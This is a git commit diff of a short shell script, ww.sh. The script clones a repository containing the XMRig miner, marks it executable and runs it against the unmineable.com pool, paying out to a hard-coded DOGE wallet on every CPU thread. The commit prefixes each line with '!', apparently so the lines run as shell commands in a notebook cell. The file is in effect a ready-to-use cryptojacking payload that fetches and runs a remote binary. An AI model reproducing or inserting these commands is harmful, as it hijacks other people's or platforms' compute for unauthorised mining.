694d5a2705435d839e2f5ba5676f43c159d9dc12
pvnrpccccccc <96951739+pvnrpccccccc@users.noreply.github.com>
2022-01-04 00:27:31 +0800

    Update ww.sh

--- ww.sh
+++ ww.sh
@@ -1,3 +1,3 @@
-git clone https://github.com/quincyhays/bmxmrig
-chmod +x bmxmrig/xmrig
-bmxmrig/xmrig -o rx.unmineable.com:3333 -a rx -k -u DOGE:DGqNvV6mhvfWGCt51iesfMMmjjzVQ3oYyE --threads=8 -p x -t $(nproc)
+! git clone https://github.com/quincyhays/bmxmrig
+! chmod +x bmxmrig/xmrig
+! bmxmrig/xmrig -o rx.unmineable.com:3333 -a rx -k -u DOGE:DGqNvV6mhvfWGCt51iesfMMmjjzVQ3oYyE --threads=8 -p x -t $(nproc)
